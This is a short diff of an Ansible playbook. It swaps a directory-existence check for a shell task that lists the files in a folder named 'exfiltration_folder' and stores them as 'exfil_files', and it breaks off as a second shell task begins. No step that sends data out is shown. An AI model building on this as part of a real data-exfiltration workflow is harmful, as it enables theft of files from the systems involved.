@@ -5,9 +5,8 @@
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
-    - name: Ansible check directory exists example.
-      stat:
-        path: "{{ exfiltration_folder }}"
+    - name: Grab files names form exfiltration_folder
+      shell: (cd {{ exfiltration_folder }}; find . -maxdepth 1 -type f) | cut -d'/' -f2
       register: exfil_files
     - shell: |
         cd {{ exfiltration_folder }}
